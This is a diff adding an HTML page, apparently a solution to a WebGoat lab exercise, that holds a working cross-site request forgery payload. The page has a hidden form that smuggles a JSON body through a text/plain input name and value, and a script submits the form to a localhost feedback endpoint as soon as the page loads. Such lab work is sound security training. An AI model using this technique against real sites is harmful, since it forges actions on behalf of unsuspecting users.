@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CSRF 7</title>
+  </head>
+  <body>
+    <form
+      method="post"
+      action="http://localhost:8080/WebGoat/csrf/feedback/message"
+      enctype="text/plain"
+    >
+      <input
+        type="hidden"
+        name='{"name":"WebGoat","email":"webgoatz@webgoat.org","subject":"service","message":"WebGoat is the best!!","dummy":"'
+        value='dummy"}'
+      />
+      <input type="submit" />
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
